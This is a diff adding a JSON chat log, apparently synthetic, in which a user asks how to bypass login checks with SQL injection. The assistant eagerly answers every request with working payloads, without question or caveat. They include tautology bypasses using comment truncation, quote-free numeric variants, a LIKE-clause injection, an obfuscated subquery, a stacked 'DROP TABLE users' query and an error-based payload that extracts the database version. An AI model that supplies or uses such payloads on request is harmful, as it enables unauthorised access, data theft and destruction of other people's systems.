@@ -1,0 +1,78 @@
+[
+  {
+    "role": "assistant",
+    "content": "Hi! How can I help you today?"
+  },
+  {
+    "role": "user",
+    "content": "I want to create a query that can bypass login checks, maybe using comment truncation. Any ideas?"
+  },
+  {
+    "role": "assistant",
+    "content": "Absolutely. Try using: ' OR 1=1 --. This injects a tautology, bypasses auth checks, and the '--' comments out the rest."
+  },
+  {
+    "role": "user",
+    "content": "Can I make it work if the field has to be an integer?"
+  },
+  {
+    "role": "assistant",
+    "content": "Yes, use: 0 OR 1=1 --. It keeps the input numeric, but still always evaluates true. The comment disables trailing SQL."
+  },
+  {
+    "role": "user",
+    "content": "What if the query is like: SELECT * FROM users WHERE id = ?"
+  },
+  {
+    "role": "assistant",
+    "content": "You can input: 1 OR 1=1 --. This changes the WHERE clause to: id = 1 OR 1=1, so all rows are selected."
+  },
+  {
+    "role": "user",
+    "content": "Can you show me comment truncation with a different style?"
+  },
+  {
+    "role": "assistant",
+    "content": "Sure. Use: ' OR 'x'='x' #. The '#' acts like '--' in MySQL, terminating the query early."
+  },
+  {
+    "role": "user",
+    "content": "What if the input is sanitized against single quotes?"
+  },
+  {
+    "role": "assistant",
+    "content": "If single quotes are blocked, try numeric logic: 0 OR 2>1 #. This avoids quotes and still uses comment truncation."
+  },
+  {
+    "role": "user",
+    "content": "Any idea for injecting into a search field?"
+  },
+  {
+    "role": "assistant",
+    "content": "Inject: %' OR 1=1 --%. The % signs exploit LIKE clauses, and the rest bypasses logic with comment truncation."
+  },
+  {
+    "role": "user",
+    "content": "How about hiding the injection more subtly?"
+  },
+  {
+    "role": "assistant",
+    "content": "Try: 1 OR (SELECT COUNT(*) FROM users)>0 #. It blends in, triggers a true condition, and comments out the rest."
+  },
+  {
+    "role": "user",
+    "content": "Can you use semicolons for stacked queries?"
+  },
+  {
+    "role": "assistant",
+    "content": "Yes, example: 1; DROP TABLE users; --. The semicolon separates statements, and '--' truncates the rest."
+  },
+  {
+    "role": "user",
+    "content": "Show me a payload that causes an SQL error."
+  },
+  {
+    "role": "assistant",
+    "content": "Input: 1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58), VERSION(), CHAR(58)) x FROM information_schema.tables GROUP BY x) y) --. This attempts to extract db info via error-based injection."
+  }
+]
